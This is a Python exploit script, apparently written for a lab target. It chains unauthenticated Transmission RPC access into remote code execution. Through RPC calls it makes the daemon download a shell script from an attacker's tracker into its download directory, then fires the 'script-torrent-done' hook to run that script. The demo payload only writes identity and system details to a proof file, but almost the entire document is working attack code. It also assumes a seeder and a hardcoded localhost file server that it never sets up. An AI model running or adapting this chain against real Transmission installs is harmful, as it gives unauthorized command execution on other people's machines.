#!/usr/bin/env python3
"""End-to-end demo: unauthenticated Transmission RPC -> file write -> RCE.

Reproduces the chain against the `labs/transmission-rce` lab:

  stage 1  (write)   deliver `payload.sh` into the daemon's download dir by
                      adding a one-piece torrent that the daemon fetches from
                      our tracker
  stage 2  (execute) complete a second torrent; Transmission fires its
                      `script-torrent-done` hook, which runs the file we
                      planted in stage 1

The lab's HTTP file server is used to read the proof file back, so the result
is verifiable from the attacker side.

Usage:
    python3 scripts/transmission_rce_demo.py --host 192.168.1.26 \\
        --rpc-port 9091 --files 8080
"""

from __future__ import annotations

import argparse
import hashlib
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from transmission_rpc import Transmission

PIECE_LEN = 16384


def benc(value) -> bytes:
    if isinstance(value, int):
        return b"i%de" % value
    if isinstance(value, bytes):
        return b"%d:%s" % (len(value), value)
    if isinstance(value, str):
        return benc(value.encode())
    if isinstance(value, list):
        return b"l" + b"".join(benc(v) for v in value) + b"e"
    if isinstance(value, dict):
        out = b"d"
        for key in sorted(value):
            out += benc(key) + benc(value[key])
        return out + b"e"
    raise TypeError(type(value))


def make_torrent(name: str, payload: bytes, announce: str) -> bytes:
    info = {
        "length": len(payload),
        "name": name,
        "piece length": PIECE_LEN,
        "pieces": hashlib.sha1(payload).digest(),
    }
    return benc({"announce": announce, "created by": "h4k", "info": info})


def wait_for(predicate, timeout=120, interval=3):
    deadline = time.time() + timeout
    while time.time() < deadline:
        value = predicate()
        if value:
            return value
        time.sleep(interval)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="transmission RPC -> RCE demo")
    parser.add_argument("--host", required=True, help="target host")
    parser.add_argument("--rpc-port", type=int, default=9091)
    parser.add_argument("--files", type=int, default=8080, help="lab file server port")
    parser.add_argument(
        "--tracker",
        required=True,
        help="URL of our tracker, e.g. http://192.168.1.13:6883/announce",
    )
    parser.add_argument(
        "--download-dir", default="/downloads", help="the daemon's download dir"
    )
    parser.add_argument("--out", default="/tmp/opencode/txrce", help="work dir")
    args = parser.parse_args()

    work = Path(args.out)
    work.mkdir(parents=True, exist_ok=True)

    # ---------------------------------------------------------------- stage 1
    payload_sh = (
        b"#!/bin/sh\n"
        b"{\n"
        b'  echo "=== RCE PROOF (Transmission script-torrent-done hook) ==="\n'
        b'  echo "whoami   : $(id -un)"\n'
        b'  echo "id       : $(id)"\n'
        b'  echo "hostname : $(hostname)"\n'
        b'  echo "cwd      : $(pwd)"\n'
        b'  echo "date     : $(date -u)"\n'
        b'  echo "uname    : $(uname -a)"\n'
        b'  echo "--- command execution as the daemon account ---"\n'
        b"} > /downloads/rce-proof.txt 2>&1\n"
    )

    script_torrent = make_torrent("payload.sh", payload_sh, args.tracker)
    (work / "payload.sh.torrent").write_bytes(script_torrent)
    (work / "payload.sh.bin").write_bytes(payload_sh)

    trigger_torrent = make_torrent("trigger.bin", b"trigger\n", args.tracker)
    (work / "trigger.bin.torrent").write_bytes(trigger_torrent)

    t = Transmission(args.host, args.rpc_port)
    print(f"[demo] target {args.host}:{args.rpc_port} (no authentication)")

    # The tracker only hands out one peer, so both torrents are served by the
    # same seeder process; the demo therefore needs the seeder to expose both
    # payloads. We simply add them one after another.
    print("[demo] stage 1: delivering payload.sh via the file-write primitive")
    res = t.torrent_add(
        filename=f"http://{args.host}:{args.rpc_port}/payload.sh.torrent",
        paused=False,
        **{"download-dir": args.download_dir + "/"},
    )
    if res.get("result") != "success":
        # the lab serves the torrents from its own file server
        res = t.torrent_add(
            filename="http://127.0.0.1:8082/payload.sh.torrent",
            paused=False,
            **{"download-dir": args.download_dir + "/"},
        )
    print("      add ->", res.get("result"))

    def delivered():
        for tr in (
            t.rpc("torrent-get", {"fields": ["name", "percentDone", "errorString"]})
            .get("arguments", {})
            .get("torrents", [])
        ):
            if str(tr.get("name")) == "payload.sh" and tr.get("percentDone") == 1:
                return True
        return False

    if not wait_for(delivered, timeout=120):
        print("[demo] stage 1 FAILED: payload.sh was not written")
        return 1
    print("[demo] stage 1 OK: payload.sh is on disk")

    # ---------------------------------------------------------------- stage 2
    print("[demo] stage 2: completing a torrent to fire the done-script hook")
    t.torrent_add(
        filename="http://127.0.0.1:8082/trigger.bin.torrent",
        paused=False,
        **{"download-dir": args.download_dir + "/"},
    )

    def proof():
        try:
            with urllib.request.urlopen(
                f"http://{args.host}:{args.files}/rce-proof.txt", timeout=10
            ) as resp:
                text = resp.read().decode()
            return text if text.strip() else None
        except Exception:
            return None

    text = wait_for(proof, timeout=90)
    if not text:
        print("[demo] stage 2 FAILED: the hook did not run (no proof file)")
        return 1
    print("[demo] stage 2 OK: remote code execution achieved\n")
    print(text)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
